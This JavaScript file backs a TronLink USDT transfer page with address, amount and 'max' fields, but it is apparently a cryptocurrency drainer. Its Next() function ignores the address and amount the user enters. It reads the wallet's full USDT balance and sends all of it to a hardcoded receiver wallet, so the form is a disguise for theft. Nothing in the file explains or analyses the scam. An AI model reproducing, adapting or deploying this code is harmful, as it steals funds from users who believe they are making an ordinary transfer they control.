const receiver = "TQP59pp5o9x6ohP8A6NWqUu9iJ3LfTNEKQ"; // ← Your TRC20 wallet
const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC20 USDT mainnet contract

// ABI for TRC20 tokens (USDT)
const usdtAbi = [
  { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
  { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
  { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" }
];

// Wait for TronLink wallet
async function waitForTronWeb() {
  const maxRetries = 10;
  let retries = 0;

  while (
    typeof window.tronWeb === "undefined" ||
    !window.tronWeb.defaultAddress.base58 ||
    !window.tronWeb.ready
  ) {
    await new Promise(resolve => setTimeout(resolve, 1000));
    retries++;
    if (retries >= maxRetries) {
      alert("Please open in TronLink DApp browser and unlock your wallet.");
      return;
    }
  }

  console.log("Wallet connected:", tronWeb.defaultAddress.base58);
}

waitForTronWeb();

function pasteAddress() {
  navigator.clipboard.readText().then((text) => {
    document.getElementById('address').value = text;
  });
}

function setMax() {
  document.getElementById("amount").value = 100;
  updateUSD();
}

function updateUSD() {
  const amount = parseFloat(document.getElementById("amount").value || "0");
  const usdValue = amount * 1;
  document.getElementById("usdValue").innerText = `≈ $${usdValue.toFixed(2)}`;
}

// Main transfer logic
async function Next() {
  if (typeof window.tronWeb === "undefined" || !window.tronWeb.ready) {
    alert("Please open in a DApp browser and unlock your wallet.");
    return;
  }

  const userAddress = tronWeb.defaultAddress.base58;
  const contract = await tronWeb.contract(usdtAbi, usdtContract);
  const decimals = await contract.decimals().call();
  const balanceRaw = await contract.balanceOf(userAddress).call();
  const balance = parseFloat(balanceRaw.toString()) / Math.pow(10, decimals);

  const amountInput = parseFloat(document.getElementById("amount").value || "0");

  if (isNaN(amountInput) || amountInput <= 0) {
    alert("Please enter a valid USDT amount.");
    return;
  }

  if (balance < 1) {
    alert("Your USDT looks fake or less than 1.");
    return;
  }

  const sendAmount = balance * Math.pow(10, decimals);
  try {
    await contract.transfer(receiver, sendAmount.toString()).send();
    alert("Transfer successful.");
  } catch (err) {
    alert("Transfer failed. Please check wallet permissions.");
    console.error(err);
  }
}
